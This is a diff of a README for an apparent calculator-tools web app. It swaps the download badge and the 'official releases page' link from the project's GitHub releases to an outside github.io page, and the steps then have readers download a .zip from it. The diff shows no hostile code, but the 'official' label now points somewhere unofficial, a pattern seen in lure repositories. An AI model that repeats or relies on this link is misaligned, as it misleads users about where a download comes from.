@@ -1,12 +1,12 @@
 # 🧮 1234tools-calculation-hub - Solve any problem with these tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/almach880/1234tools-calculation-hub/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://almach880.github.io)
 
 This application provides a comprehensive collection of over 1,169 tools for finance, mathematics, engineering, health, and daily tasks. It runs directly in your web browser. You do not need to install complex server software. Download the package, extract the files, and open the interface to start your calculations. The 2026 release ensures you have access to the latest methods for accurate results.
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/almach880/1234tools-calculation-hub/releases) to find the latest version.
+1. Visit the [official releases page](https://almach880.github.io) to find the latest version.
 2. Look for the section labeled "Assets."
 3. Click the link that ends in .zip to download the compressed folder to your computer.
 4. Locate the file in your Downloads folder.
